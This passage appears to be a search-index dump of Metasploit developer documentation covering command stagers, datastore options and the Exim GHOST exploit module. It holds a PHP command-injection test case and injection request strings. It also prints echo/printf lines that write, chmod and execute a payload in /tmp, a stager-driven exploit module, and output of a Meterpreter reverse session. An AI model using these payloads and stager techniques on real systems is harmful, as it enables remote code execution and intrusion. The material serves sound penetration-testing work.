:tftp ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win' Bourne Command Stager - Multi Platform The Bourne command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl. To use the Bourne stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'bourne' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :bourne ) Echo Command Stager - Multi Platform The echo command stager is suitable for multiple platforms except for Windows. It just echos the payload, chmod and execute it. An example of that looks similar to this: echo -en \\\\x41\\\\x41\\\\x41\\\\x41 >> /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload To use the echo stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'echo' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :echo ) Printf Command Stager - Multi Platform The printf command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this: printf '\\177\\177\\177\\177' >> /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload To use the printf stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'printf' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :printf )","title":"How to use command stagers"},{"location":"dev/dark/How-to-use-command-stagers/#the-vulnerability-test-case","text":"The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping: <?php if ( isset ( $_GET [ \"ip\" ]) ) { $output = system ( \"ping -c 1 \" . $_GET [ \"ip\" ]); die ( $output ); } ?> <html> <body> <form action = \"ping.php\" method = \"GET\"> IP to ping: <input type = \"text\" name = \"ip\" /> <input type = \"submit\" /> </form> </body> </html> Place the above PHP script (ping.php) on an Ubuntu + Apache + PHP server. Under normal usage, this is how the script behaves - it just pings the host you specify, and shows you the output: $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms OK, now we can abuse that a little and execute another command (id): $ curl \"http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id\" PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms --- 127.0.0.1 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data) See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.","title":"The Vulnerability Test Case"},{"location":"dev/dark/How-to-use-command-stagers/#the-msfexploitcmdstager-mixin","text":"Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do: 1. Include the Msf::Exploit::CmdStager mixin Although there are eight flavors of mixins/stagers, you only need to include Msf::Exploit::CmdStager when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers: include Msf :: Exploit :: CmdStager 2. Declare your flavors To tell Msf::Exploit::CmdStager what flavors you want, you can add the CmdStagerFlavor info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed. An example of setting flavors for a specific target: 'Targets' => [ [ 'Windows' , { 'Arch' => [ ARCH_X86_64 , ARCH_X86 ] , 'Platform' => 'win' , 'CmdStagerFlavor' => [ 'certutil' , 'vbs' ] } ] ] Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin) execute_cmdstager ( flavor : :vbs ) 3. Create the execute_command method You also must create a def execute_command(cmd, opts = {}) method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the cmd variable to the vulnerable code. 4. Call #execute_cmdstager to begin And lastly, in your exploit method, call execute_cmdstager to begin the command stager. Over the years, we have also learned that these options are quite handy when calling execute_cmdstager: flavor - You can specify what command stager (flavor) to use from here. Options are: :bourne , :debug_asm , :debug_write , :echo , :printf , :vbs , :certutil , :tftp . delay - How much time to delay between each command execution. 0.25 is default. linemax - Maximum number of characters per command. 2047 is default. Msf::Exploit::CmdStager Template At the minimum, this is how your exploit should start when you're using the CmdStager mixin: require 'msf/core' class MetasploitModule < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: CmdStager def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Command Injection Using CmdStager\" , 'Description' => %q{ This exploits a command injection using the command stager. } , 'License' => MSF_LICENSE , 'Author' => [ 'sinn3r' ] , 'References' => [ [ 'URL' , 'http://metasploit.com' ] ] , 'Platform' => 'linux' , 'Targets' => [ [ 'Linux' , {} ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'CmdStagerFlavor' => [ 'printf' ] , 'Privileged' => false , 'DisclosureDate' => \"Jun 10 2016\" , 'DefaultTarget' => 0 )) end def execute_command ( cmd , opts = {}) # calls some method to inject cmd to the vulnerable code. end def exploit print_status ( \"Exploiting...\" ) execute_cmdstager end end As you can see, we have chosen the \"printf\" flavor as our command stager. We will explain more about this later, but basically what it does is it writes our payload to /tmp and execute it. Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this: 127.0.0.1+%26%26+[Malicious commands] We do that in execute_command using HttpClient . Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected: def filter_bad_chars ( cmd ) cmd . gsub! ( /chmod \\+x/ , 'chmod 777' ) cmd . gsub! ( /;/ , ' %26%26 ' ) cmd . gsub! ( / / , '+' ) end def execute_command ( cmd , opts = {}) send_request_cgi ({ 'method' => 'GET' , 'uri' => '/ping.php' , 'encode_params' => false , 'vars_get' => { 'ip' => \"127.0.0.1+%26%26+ #{ filter_bad_chars ( cmd ) } \" } }) end def exploit print_status ( \"Exploiting...\" ) execute_cmdstager end And let's run that, we should have a shell: msf exploit(cmdstager_demo) > run [*] Started reverse TCP handler on 10.6.0.92:4444 [*] Exploiting... [*] Transmitting intermediate stager for over-sized stage...(105 bytes) [*] Sending stage (1495599 bytes) to 10.6.0.92 [*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500","title":"The Msf::Exploit::CmdStager Mixin"},{"location":"dev/dark/How-to-use-command-stagers/#flavors","text":"Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command stagers you can use.","title":"Flavors"},{"location":"dev/dark/How-to-use-command-stagers/#vbs-command-stager-windows-only","text":"The VBS command stager is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a VBS script using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it. If you are exploiting Windows that supports Powershell, then you might want to consider using that instead of the VBS stager, because Powershell tends to be more stealthy. To use the VBS stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'vbs' ] Or set the :vbs key to execute_cmdstager: execute_cmdstager ( flavor : :vbs ) You will also need to make sure the module's supported platforms include windows (also in the metadata), example: 'Platform' => 'win'","title":"VBS Command Stager - Windows Only"},{"location":"dev/dark/How-to-use-command-stagers/#certutil-command-stager-windows-only","text":"Certutil is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8. One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates: echo -----BEGIN CERTIFICATE----- > encoded.txt echo Just Base64 encode your binary data echo TVoAAA == >> encoded.txt echo -----END CERTIFICATE----- >> encoded.txt certutil -decode encoded.txt decoded.bin To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it. To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'certutil' ] Or set the :certutil key to execute_cmdstager: execute_cmdstager ( flavor : :certutil ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win'","title":"Certutil Command Stager - Windows Only"},{"location":"dev/dark/How-to-use-command-stagers/#debug_write-command-stager-windows-only","text":"The debug_write command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute. Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net. To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'debug_write' ] Or set the :debug_write key to execute_cmdstager: execute_cmdstager ( flavor : :debug_write ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win'","title":"Debug_write Command Stager - Windows Only"},{"location":"dev/dark/How-to-use-command-stagers/#debug_asm-command-stager-windows-only","text":"The debug_asm command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it. To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'debug_asm' ] Or set the :debug_asm key to execute_cmdstager: execute_cmdstager ( flavor : :debug_asm ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win'","title":"Debug_asm Command Stager - Windows Only"},{"location":"dev/dark/How-to-use-command-stagers/#tftp-command-stager-windows-only","text":"The TFTP command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default. The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root: rvmsudo ./msfconsole To use the TFTP stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'tftp' ] Or set the :tftp key to execute_cmdstager: execute_cmdstager ( flavor : :tftp ) You will also need to remember to set the platform in the metadata: 'Platform' => 'win'","title":"TFTP Command Stager - Windows Only"},{"location":"dev/dark/How-to-use-command-stagers/#bourne-command-stager-multi-platform","text":"The Bourne command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl. To use the Bourne stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'bourne' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :bourne )","title":"Bourne Command Stager - Multi Platform"},{"location":"dev/dark/How-to-use-command-stagers/#echo-command-stager-multi-platform","text":"The echo command stager is suitable for multiple platforms except for Windows. It just echos the payload, chmod and execute it. An example of that looks similar to this: echo -en \\\\x41\\\\x41\\\\x41\\\\x41 >> /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload To use the echo stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'echo' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :echo )","title":"Echo Command Stager - Multi Platform"},{"location":"dev/dark/How-to-use-command-stagers/#printf-command-stager-multi-platform","text":"The printf command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this: printf '\\177\\177\\177\\177' >> /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload To use the printf stager, either specify your CmdStagerFlavor in the metadata: 'CmdStagerFlavor' => [ 'printf' ] Or set the :bourne key to execute_cmdstager: execute_cmdstager ( flavor : :printf )","title":"Printf Command Stager - Multi Platform"},{"location":"dev/dark/How-to-use-datastore-options/","text":"Note: This documentation may need to be vetted A datastore option is a type of variable that can be set by the user, allowing various components of Metasploit to be more configurable during use. For example, in msfconsole, you can set the ConsoleLogging option in order to log all the console input/output - something that's kind of handy for documentation purposes during a pentest. When you load a module, there will be a lot more options registered by the mixin(s) or the module. Some common ones include: RHOST and RPORT for a server-side exploit or auxiliary module, SRVHOST for a client-side module, etc. The best way to find out exactly what datastore options you can set is by using these commands: show options - Shows you all the basic options. show advanced - Shows you all the advanced options. show missing - Shows you all the required options you have not configured. set - Shows you everything. Obviously you also use this command to set an option. Option sources: ModuleDataStore, active_module, session, and framework How users look at datastore options: On the user's side, datastore options are seen as global or module-level: Global means all the modules can use that option, which can be set by using the setg command. Module-level means only that particular module you're using remembers that datastore option, no other components will know about it. You are setting a module-level option if you load a module first, and then use the set command, like the following: msf > use exploit/windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) > set rhost 10.0.1.3 rhost => 10.0.1.3 How Metasploit developers look at datastore options: On the development side, things are a little crazier. Datastore options actually can be found in at least four different sources: the ModuleDataStore object, active_module, session object, or the framework object. If you're just doing module development, the best source you can trust is the ModuleDataStore object. This object has a specific load order before handing you the option you want: if the option can be found in the module's datastore, it will give you that. If not found, it will give you the one from framework. The following is an example of how to read a datastore option in a module: current_host = datastore [ 'RHOST' ] If your dev work is outside the module realm, there is a good possibility that you don't even have the ModuleDataStore object. But in some cases, you still might be able to read from the active_module accessor from the driver. Or if you have access to ModuleCommandDispatcher , there is a mod method too that gives you the same thing, and sometimes mixins pass this around in a run_simple method while dispatching a module. One example you can look at is the Msf::Ui::Console::CommandDispatcher::Auxiliary class. In some cases such as running a script in post exploitation, you might not have ModuleDataStore or even active_module, but you should still have a session object. There should be an exploit_datastore that gives you all the datastore options: session . exploit_datastore If you don't have access to the module, or to a session object, the last source is obviously the framework object, and there is ALWAYS a framework object. However, like we said earlier, if the user sets a module-level option, no other components will see it, this includes the framework object: framework . datastore So now you know there are multiple sources of datastore options. And hopefully at this point you are well aware that not all sources necessarily share the same thing. If you have to try everything, as a general rule, this should be your load order: Try from the ModuleDataStore Try from active_module Try from session Try from framework Core option types All all core datastore option types are defined in the option_container.rb file as classes. You should always pick the most appropriate one because each has its own input validator. When you initialize an option during datastore registration, it should be in the following format: OptSomething . new ( option_name , [ boolean , description , value ] ) option_name - Clearly means the name of the datastore option. boolean - The first attribute, true means this is a required option, false means optional. description - A short description about this option value - A default value. Note if the first attribute is false, you don't need to provide a value, it'll be set to nil automatically. Now let's talk about what classes are available: OptString - Typically for a string option. If the input begins with \"file://\", OptString will also automatically assume this is a file, and read from it. However, there is no file path validation when this happens, so if you want to load a file, you should use the OptPath instead, and then read the file yourself. Code example: OptString . new ( 'MYTEST' , [ true , 'Set a MYTEST option' , 'This is a default value' ] ) OptRaw - It actually functions exactly the same as OptString. OptBool - Boolean option. It will validate if the input is a variant of either true or false. For example: y, yes, n, no, 0, 1, etc. Code example: OptBool . new ( 'BLAH' , [ true , 'Set a BLAH option' , false ] ) OptEnum - Basically this will limit the input to specific choices. For example, if you want the input to be either \"apple\", or \"orange\", and nothing else, then OptEnum is the one for you. Code example: # Choices are: apple or range, defaults to apple OptEnum . new ( 'FRUIT' , [ true , 'Set a fruit' , 'apple' , [ 'apple' , 'orange' ]] ) OptPort - For an input that's meant to be used as a port number. This number should be between 0 - 65535. Code example: OptPort . new ( 'RPORT' , [ true , 'Set a port' , 21 ] ) OptAddress - An input that is an IPv4 address. Code example: OptAddress . new ( 'IP' , [ true , 'Set an IP' , '10.0.1.3' ] ) OptAddressRange - An input that is a range of IPv4 addresses, for example: 10.0.1.1-10.0.1.20, or 10.0.1.1/24. You can also supply a file path instead of a range, and it will automatically treat that file as a list of IPs. Or, if you do the rand:3 syntax, with 3 meaning 3 times, it will generate 3 random IPs for you. Basic code example: OptAddressRange . new ( 'Range' , [ true , 'Set an IP range' , '10.0.1.3-10.0.1.23' ] ) OptPath - If your datastore option is asking for a local file path, then use this. OptPath . new ( 'FILE' , [ true , 'Load a local file' ] ) OptInt - This can be either a hex value, or decimal. OptInt . new ( 'FILE' , [ true , 'A hex or decimal' , 1024 ] ) OptRegexp - Datastore option is a regular expression. OptRegexp . new ( 'PATTERN' , [ true , 'Match a name' , '^alien' ] ), Other types: In some cases, there might not be a well-suited datastore option type for you. The best example is an URL: even though there's no such thing as a OptUrl, what you can do is use the OptString type, and then in your module, do some validation for it, like this: def valid? ( input ) if input =~ /^http:\\/\\/.+/i return true else # Here you can consider raising OptionValidateError return false end end if valid? ( datastore [ 'URL' ] ) # We can do something with the URL else # Not the format we're looking for. Refuse to do anything. end The register_options method The register_options method can register multiple basic datastore options. Basic datastore options are the ones that either must be configured, such as the RHOST option in a server-side exploit. Or it's very commonly used, such as various username/password options found in a login module. The following is an example of registering multiple datastore options in a module: register_options ( [ OptString . new ( 'SUBJECT' , [ true , 'Set a subject' ] ), OptString . new ( 'MESSAGE' , [ true , 'Set a message' ] ) ] , self . class ) The register_advanced_options method The register_advanced_options method can register multiple advanced datastore options. Advanced datastore options are the ones that never require the user to configure before using the module. For example, the Proxies option is almost always considered as \"advanced\". But of course, it can also mean that's something that most user will find difficult to configure. An example of register an advanced option: register_advanced_options ( [ OptInt . new ( 'TIMEOUT' , [ true , 'Set a timeout, in seconds' , 60 ] ) ] , self . class ) Changing the default value for a datastore option When a datastore option is already registered by a mixin, there are still ways to change the default value from the module. You can either use the register_options method, or adding a DefaultOptions key in the module's metadata. Using register_options to change the default value: One of the advantages of using register_options is that if the datastore option is advanced, this allows it to be on the basic option menu, meaning when people do \"show options\" on msfconsole, that option will be there instead. You also get to change the option description, and whether it should be required or not with this method. Using DefaultOptions to change the default value: When Metasploit initializes a module, an import_defaults method is called . This method will update all existing datastore options (which is why register_options can be used to update default values), and then it will specifically check the DefaultOptions key from the module's metadata, and update again. Here's an example of an exploit module's initialize portion with the DefaultOptions key: def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Module name\" , 'Description' => %q{ This is an example of setting the default value of RPORT using the DefaultOptions key } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'References' => [ [ 'URL' , '' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'Windows' , { 'Ret' => 0x41414141 } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'DefaultOptions' => { 'RPORT' => 8080 }, 'Privileged' => false , 'DisclosureDate' => \"\" , 'DefaultTarget' => 0 )) end The deregister_options method The deregister_options method can deregister either basic or advanced options. Usage is really straight-forward: deregister_options ( 'OPTION1' , 'OPTION2' , 'OPTION3' ) Modifying datastore options at run-time Currently, the safest way to modify a datastore option at run-time is to override a method. For example, some mixins retrieve the RPORT option like this: def rport datastore [ 'RPORT' ] end In that scenario, you can override this rport method from your module, and return a different value: def rport 80 end This way, when a mixin wants that information, it will end up with the value 80, and not whatever is actually in datastore['RPORT'] . Ideal datastore naming Normal options are always UPPERCASE, advanced options are CamelCase, evasion options are Prefixed::CamelCase","title":"How to use datastore options"},{"location":"dev/dark/How-to-use-datastore-options/#option-sources-moduledatastore-active_module-session-and-framework","text":"How users look at datastore options: On the user's side, datastore options are seen as global or module-level: Global means all the modules can use that option, which can be set by using the setg command. Module-level means only that particular module you're using remembers that datastore option, no other components will know about it. You are setting a module-level option if you load a module first, and then use the set command, like the following: msf > use exploit/windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) > set rhost 10.0.1.3 rhost => 10.0.1.3 How Metasploit developers look at datastore options: On the development side, things are a little crazier. Datastore options actually can be found in at least four different sources: the ModuleDataStore object, active_module, session object, or the framework object. If you're just doing module development, the best source you can trust is the ModuleDataStore object. This object has a specific load order before handing you the option you want: if the option can be found in the module's datastore, it will give you that. If not found, it will give you the one from framework. The following is an example of how to read a datastore option in a module: current_host = datastore [ 'RHOST' ] If your dev work is outside the module realm, there is a good possibility that you don't even have the ModuleDataStore object. But in some cases, you still might be able to read from the active_module accessor from the driver. Or if you have access to ModuleCommandDispatcher , there is a mod method too that gives you the same thing, and sometimes mixins pass this around in a run_simple method while dispatching a module. One example you can look at is the Msf::Ui::Console::CommandDispatcher::Auxiliary class. In some cases such as running a script in post exploitation, you might not have ModuleDataStore or even active_module, but you should still have a session object. There should be an exploit_datastore that gives you all the datastore options: session . exploit_datastore If you don't have access to the module, or to a session object, the last source is obviously the framework object, and there is ALWAYS a framework object. However, like we said earlier, if the user sets a module-level option, no other components will see it, this includes the framework object: framework . datastore So now you know there are multiple sources of datastore options. And hopefully at this point you are well aware that not all sources necessarily share the same thing. If you have to try everything, as a general rule, this should be your load order: Try from the ModuleDataStore Try from active_module Try from session Try from framework","title":"Option sources: ModuleDataStore, active_module, session, and framework"},{"location":"dev/dark/How-to-use-datastore-options/#core-option-types","text":"All all core datastore option types are defined in the option_container.rb file as classes. You should always pick the most appropriate one because each has its own input validator. When you initialize an option during datastore registration, it should be in the following format: OptSomething . new ( option_name , [ boolean , description , value ] ) option_name - Clearly means the name of the datastore option. boolean - The first attribute, true means this is a required option, false means optional. description - A short description about this option value - A default value. Note if the first attribute is false, you don't need to provide a value, it'll be set to nil automatically. Now let's talk about what classes are available: OptString - Typically for a string option. If the input begins with \"file://\", OptString will also automatically assume this is a file, and read from it. However, there is no file path validation when this happens, so if you want to load a file, you should use the OptPath instead, and then read the file yourself. Code example: OptString . new ( 'MYTEST' , [ true , 'Set a MYTEST option' , 'This is a default value' ] ) OptRaw - It actually functions exactly the same as OptString. OptBool - Boolean option. It will validate if the input is a variant of either true or false. For example: y, yes, n, no, 0, 1, etc. Code example: OptBool . new ( 'BLAH' , [ true , 'Set a BLAH option' , false ] ) OptEnum - Basically this will limit the input to specific choices. For example, if you want the input to be either \"apple\", or \"orange\", and nothing else, then OptEnum is the one for you. Code example: # Choices are: apple or range, defaults to apple OptEnum . new ( 'FRUIT' , [ true , 'Set a fruit' , 'apple' , [ 'apple' , 'orange' ]] ) OptPort - For an input that's meant to be used as a port number. This number should be between 0 - 65535. Code example: OptPort . new ( 'RPORT' , [ true , 'Set a port' , 21 ] ) OptAddress - An input that is an IPv4 address. Code example: OptAddress . new ( 'IP' , [ true , 'Set an IP' , '10.0.1.3' ] ) OptAddressRange - An input that is a range of IPv4 addresses, for example: 10.0.1.1-10.0.1.20, or 10.0.1.1/24. You can also supply a file path instead of a range, and it will automatically treat that file as a list of IPs. Or, if you do the rand:3 syntax, with 3 meaning 3 times, it will generate 3 random IPs for you. Basic code example: OptAddressRange . new ( 'Range' , [ true , 'Set an IP range' , '10.0.1.3-10.0.1.23' ] ) OptPath - If your datastore option is asking for a local file path, then use this. OptPath . new ( 'FILE' , [ true , 'Load a local file' ] ) OptInt - This can be either a hex value, or decimal. OptInt . new ( 'FILE' , [ true , 'A hex or decimal' , 1024 ] ) OptRegexp - Datastore option is a regular expression. OptRegexp . new ( 'PATTERN' , [ true , 'Match a name' , '^alien' ] ), Other types: In some cases, there might not be a well-suited datastore option type for you. The best example is an URL: even though there's no such thing as a OptUrl, what you can do is use the OptString type, and then in your module, do some validation for it, like this: def valid? ( input ) if input =~ /^http:\\/\\/.+/i return true else # Here you can consider raising OptionValidateError return false end end if valid? ( datastore [ 'URL' ] ) # We can do something with the URL else # Not the format we're looking for. Refuse to do anything. end","title":"Core option types"},{"location":"dev/dark/How-to-use-datastore-options/#the-register_options-method","text":"The register_options method can register multiple basic datastore options. Basic datastore options are the ones that either must be configured, such as the RHOST option in a server-side exploit. Or it's very commonly used, such as various username/password options found in a login module. The following is an example of registering multiple datastore options in a module: register_options ( [ OptString . new ( 'SUBJECT' , [ true , 'Set a subject' ] ), OptString . new ( 'MESSAGE' , [ true , 'Set a message' ] ) ] , self . class )","title":"The register_options method"},{"location":"dev/dark/How-to-use-datastore-options/#the-register_advanced_options-method","text":"The register_advanced_options method can register multiple advanced datastore options. Advanced datastore options are the ones that never require the user to configure before using the module. For example, the Proxies option is almost always considered as \"advanced\". But of course, it can also mean that's something that most user will find difficult to configure. An example of register an advanced option: register_advanced_options ( [ OptInt . new ( 'TIMEOUT' , [ true , 'Set a timeout, in seconds' , 60 ] ) ] , self . class )","title":"The register_advanced_options method"},{"location":"dev/dark/How-to-use-datastore-options/#changing-the-default-value-for-a-datastore-option","text":"When a datastore option is already registered by a mixin, there are still ways to change the default value from the module. You can either use the register_options method, or adding a DefaultOptions key in the module's metadata. Using register_options to change the default value: One of the advantages of using register_options is that if the datastore option is advanced, this allows it to be on the basic option menu, meaning when people do \"show options\" on msfconsole, that option will be there instead. You also get to change the option description, and whether it should be required or not with this method. Using DefaultOptions to change the default value: When Metasploit initializes a module, an import_defaults method is called . This method will update all existing datastore options (which is why register_options can be used to update default values), and then it will specifically check the DefaultOptions key from the module's metadata, and update again. Here's an example of an exploit module's initialize portion with the DefaultOptions key: def initialize ( info = {}) super ( update_info ( info , 'Name' => \"Module name\" , 'Description' => %q{ This is an example of setting the default value of RPORT using the DefaultOptions key } , 'License' => MSF_LICENSE , 'Author' => [ 'Name' ] , 'References' => [ [ 'URL' , '' ] ] , 'Platform' => 'win' , 'Targets' => [ [ 'Windows' , { 'Ret' => 0x41414141 } ] ] , 'Payload' => { 'BadChars' => \" \\x00 \" }, 'DefaultOptions' => { 'RPORT' => 8080 }, 'Privileged' => false , 'DisclosureDate' => \"\" , 'DefaultTarget' => 0 )) end","title":"Changing the default value for a datastore option"},{"location":"dev/dark/How-to-use-datastore-options/#the-deregister_options-method","text":"The deregister_options method can deregister either basic or advanced options. Usage is really straight-forward: deregister_options ( 'OPTION1' , 'OPTION2' , 'OPTION3' )","title":"The deregister_options method"},{"location":"dev/dark/How-to-use-datastore-options/#modifying-datastore-options-at-run-time","text":"Currently, the safest way to modify a datastore option at run-time is to override a method. For example, some mixins retrieve the RPORT option like this: def rport datastore [ 'RPORT' ] end In that scenario, you can override this rport method from your module, and return a different value: def rport 80 end This way, when a mixin wants that information, it will end up with the value 80, and not whatever is actually in datastore['RPORT'] .","title":"Modifying datastore options at run-time"},{"location":"dev/dark/How-to-use-datastore-options/#ideal-datastore-naming","text":"Normal options are always UPPERCASE, advanced options are CamelCase, evasion options are Prefixed::CamelCase","title":"Ideal datastore naming"},{"location":"dev/dark/How-to-use-exim_gethostbyname_bof.rb-(Exim-GHOST-Buffer-Overflow)/","text":"The Exim GHOST buffer overflow is a vulnerability found by researchers from Qualys. On March 17 th 2015, Qualys released an exploit module demonstrating the exploitability of this flaw, which is now exim_gethostbyname_bof.rb in Metasploit Framework. When Qualys released the exploit, it included a lot of technical details for debugging and usage purposes. We decided to put all that here in a more readable format. What is \"GHOST\" This is a heap based buffer overflow found in GNU C Library's **g**et**host**byname functions since glibc-2.2 (November 10, 2000), which is part of the Linux operating system, such as: Debian, Red Hat, CentOS, and Ubuntu. Exploitable Requirements On the server-side (victim): glibc-2.6 - glibc-2.17: The exploit depends on the newer versions' fd_nextsize (a member of the malloc_chunk structure) to remotely obtain the address of Exim's smtp_cmd_buffer in the heap. Exim server. The first exploitable version is Exim-4.77, maybe older. The exploit depends on the newer versions' 16-KB smtp_cmd_buffer to reliably set up the heap as described in the advisory. The Exim server also must enable helo_try_verify_hosts or helo_verify_hosts in the /etc/exim4/exim4.conf.template file. The \"verify = helo\" ACL might be exploitable too, but the attack vector isn't as reliable, therefore not supported by the module. For testing purposes, if you need to find a vulnerable system, you can try Debian 7 (it should come with an exploitable Exim server): http://ftp.cae.tntech.edu/debian-cd/dvd/debian-7.7.0-i386-DVD-1.iso On the attacker's side: The attacker's IPv4 address must have both forward and reverse DNS entries that match each other (Forward-Confirmed reverse DNS). The check method The GHOST exploit module comes with a check method. It is explicit, which means the check will actually try to trigger the vulnerability to determine if the host is vulnerable or not. The check is also enforced when you use the \"exploit\" or \"run\" command. However, you can turn off the enforcement by setting the FORCE_EXPLOIT datastore option to true. For example: set FORCE_EXPLOIT true run Troubleshooting If the exim_gethostbyname_bof.rb module has failed on you: Failure Explanation bad SENDER_HOST_ADDRESS (nil) The SENDER_HOST_ADDRESS datastore option was not specified bad SENDER_HOST_ADDRESS (not in IPv4 dotted-decimal notation) The SENDER_HOST_ADDRESS datastore option was specified, but not in IPv4 dotted-decimal notation bad SENDER_HOST_ADDRESS (helo_verify_hosts) The SENDER_HOST_ADDRESS datastore option does not match the IPv4 address of the SMTP client (Metasploit), as seen by the SMTP server (Exim). bad SENDER_HOST_ADDRESS (no FCrDNS) the IPv4 address of the SMTP client (Metasploit) has no Forward-Confirmed reverse DNS. not vuln? old glibc? (no leaked_arch) the remote Exim server is either not vulnerable, or not exploitable (glibc versions older than glibc-2.6 have no fd_nextsize member in their malloc_chunk structure). NUL, CR, LF in addr? (no leaked_addr) Exim's heap address contains bad characters (NUL, CR, LF) and was therefore mangled during the information leak; this exploit is able to reconstruct most of these addresses, but not all (worst-case probability is ~1/85, but could be further improved). Brute-force SUCCESS\" followed by a nil reply, but no shell the remote Unix command was executed, but spawned a bind-shell or a reverse-shell that failed to connect (maybe because of a firewall, or a NAT, etc). Brute-force SUCCESS\" followed by a non-nil reply, and no shell The remote Unix command was executed, but failed to spawn the shell (maybe because the setsid command doesn't exist, or awk isn't gawk, or netcat doesn't support the -6 or -e option, or telnet doesn't support the -z option, etc). Module Demonstration When everything is dialed in correctly, a successful attack should look like the following: msf exploit(exim_gethostbyname_bof) > run [*] Started reverse double handler [*] Trying information leak... [!] {:heap_shift=>736} [!] {:write_offset=>128, :error=>\"503 sender not yet given\"} [!] {:write_offset=>136, :error=>\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\"} [!] {:error=>[\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\", \"\", \"503 \\x89\\x10\", \"177\", \"177\\\\177\\\\177\", \"vJN\\\\177\\\\177\\\\177\\\\177\"]} [!] {:leaked_arch=>\"x86\"} [!] {:count=>{\"\\xE0.\\xFF\\xB7\\xE0.\\xFF\\xB7er not yet given\"=>8, \"hF\\xFE\\xB7hF\\xFE\\xB7er not yet given\"=>2}} [+] Successfully 